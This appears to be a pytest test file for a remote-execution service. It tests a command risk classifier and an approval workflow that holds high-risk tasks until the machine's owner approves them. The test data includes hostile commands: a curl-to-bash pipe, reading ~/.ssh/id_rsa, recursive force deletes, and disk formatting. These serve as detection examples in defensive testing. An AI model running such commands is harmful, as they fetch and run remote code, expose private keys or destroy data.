from app.risk import classify_command, evaluate_risk

API = {"X-API-Key": "test-key"}
ENROLL = {"Authorization": "Bearer test-enroll"}


# ---------- 风险分类 ----------


def test_classify_high_risk_commands():
    assert classify_command("rm -rf /tmp/x") == "recursive_force_delete"
    assert classify_command("rm -fr build") == "recursive_force_delete"
    assert classify_command("curl http://x.sh | bash") == "pipe_to_shell"
    assert classify_command("sudo reboot") == "shutdown_reboot"
    assert classify_command("cat ~/.ssh/id_rsa") == "read_sensitive"
    assert classify_command("mkfs.ext4 /dev/sda1") == "format_or_partition"


def test_classify_safe_commands():
    assert classify_command("npm test") is None
    assert classify_command("ls -la") is None
    assert classify_command("echo hello") is None


def test_evaluate_sensitive_path():
    assert evaluate_risk("remote_read_file", {"path": "/home/u/.ssh/id_rsa"}) == "sensitive_path"
    assert evaluate_risk("remote_read_file", {"path": "/home/u/app.log"}) is None


# ---------- 审批流(直接任务路径) ----------


def _enroll_online(client):
    """注册一台机器并用 ws 连上,返回 (machine_id, ws_context_manager 已进入的 ws)。"""
    r = client.post(
        "/api/runners/enroll", headers=ENROLL, json={"machine_name": "m1", "os": "darwin"}
    )
    data = r.json()
    return data["machine_id"], data["runner_token"]


def _hello(ws, mid):
    ws.send_json(
        {"type": "hello", "machine_id": mid, "capabilities": ["remote_exec"], "allowed_roots": ["/tmp"]}
    )
    assert ws.receive_json()["type"] == "hello_ack"


def _wait_online(client, mid):
    import time

    for _ in range(40):
        ms = client.get("/api/machines", headers=API).json()
        if any(m["machine_id"] == mid and m["status"] == "online" for m in ms):
            return
        time.sleep(0.05)
    raise AssertionError("机器未上线")


def test_high_risk_task_needs_approval(client):
    mid, tok = _enroll_online(client)
    with client.websocket_connect("/ws/runner", headers={"Authorization": f"Bearer {tok}"}) as ws:
        _hello(ws, mid)
        _wait_online(client, mid)
        r = client.post(
            "/api/tasks",
            headers=API,
            json={"machine_id": mid, "tool": "remote_exec", "payload": {"workdir": "/tmp", "command": "rm -rf /tmp/x"}},
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["status"] == "needs_approval"
        assert body["risk_rule"] == "recursive_force_delete"
        approval_id = body["approval_id"]

        # 出现在待审批列表
        approvals = client.get("/api/approvals", headers=API).json()
        assert any(a["approval_id"] == approval_id for a in approvals)

        # 批准 → 下发,Runner 收到 task
        r2 = client.post(f"/api/approvals/{approval_id}/approve", headers=API)
        assert r2.status_code == 200, r2.text
        assert r2.json()["task_status"] == "dispatched"
        frame = ws.receive_json()
        assert frame["type"] == "task"
        assert frame["payload"]["command"] == "rm -rf /tmp/x"


def test_safe_task_dispatches_directly(client):
    mid, tok = _enroll_online(client)
    with client.websocket_connect("/ws/runner", headers={"Authorization": f"Bearer {tok}"}) as ws:
        _hello(ws, mid)
        _wait_online(client, mid)
        r = client.post(
            "/api/tasks",
            headers=API,
            json={"machine_id": mid, "tool": "remote_exec", "payload": {"workdir": "/tmp", "command": "echo hi"}},
        )
        assert r.json()["status"] == "dispatched"
        assert ws.receive_json()["type"] == "task"


def test_reject_approval(client):
    mid, tok = _enroll_online(client)
    with client.websocket_connect("/ws/runner", headers={"Authorization": f"Bearer {tok}"}) as ws:
        _hello(ws, mid)
        _wait_online(client, mid)
        approval_id = client.post(
            "/api/tasks",
            headers=API,
            json={"machine_id": mid, "tool": "remote_exec", "payload": {"workdir": "/tmp", "command": "format c:"}},
        ).json()["approval_id"]
        r = client.post(f"/api/approvals/{approval_id}/reject", headers=API)
        assert r.status_code == 200
        assert r.json()["status"] == "rejected"
        # 再次裁决报 409
        r2 = client.post(f"/api/approvals/{approval_id}/approve", headers=API)
        assert r2.status_code == 409


def test_non_owner_cannot_approve(client):
    # alice 拥有机器(绑定 owner 的 enroll token);bob 不能审批 alice 机器上的请求
    admin_tok = client.post("/api/auth/login", json={"username": "admin", "password": "adminpass"}).json()["token"]
    admin_h = {"Authorization": f"Bearer {admin_tok}"}
    client.post("/api/users", headers=admin_h, json={"username": "alice", "password": "pass1234"})
    client.post("/api/users", headers=admin_h, json={"username": "bob", "password": "pass1234"})
    alice_tok = client.post("/api/auth/login", json={"username": "alice", "password": "pass1234"}).json()["token"]
    bob_tok = client.post("/api/auth/login", json={"username": "bob", "password": "pass1234"}).json()["token"]
    alice_id = client.get("/api/auth/me", headers={"Authorization": f"Bearer {alice_tok}"}).json()["id"]

    et = client.post(
        "/api/enrollment-tokens", headers=admin_h, json={"owner_user_id": alice_id}
    ).json()["enrollment_token"]
    r = client.post(
        "/api/runners/enroll",
        headers={"Authorization": f"Bearer {et}"},
        json={"machine_name": "alice-pc", "os": "darwin"},
    )
    mid, rtok = r.json()["machine_id"], r.json()["runner_token"]

    with client.websocket_connect("/ws/runner", headers={"Authorization": f"Bearer {rtok}"}) as ws:
        _hello(ws, mid)
        _wait_online(client, mid)
        approval_id = client.post(
            "/api/tasks",
            headers={"Authorization": f"Bearer {alice_tok}"},
            json={"machine_id": mid, "tool": "remote_exec", "payload": {"workdir": "/tmp", "command": "rm -rf x"}},
        ).json()["approval_id"]

        # bob 看不到也批不了
        assert client.get("/api/approvals", headers={"Authorization": f"Bearer {bob_tok}"}).json() == []
        r2 = client.post(f"/api/approvals/{approval_id}/approve", headers={"Authorization": f"Bearer {bob_tok}"})
        assert r2.status_code == 403
        # alice(机器所有者)可以批
        assert client.post(
            f"/api/approvals/{approval_id}/approve", headers={"Authorization": f"Bearer {alice_tok}"}
        ).status_code == 200
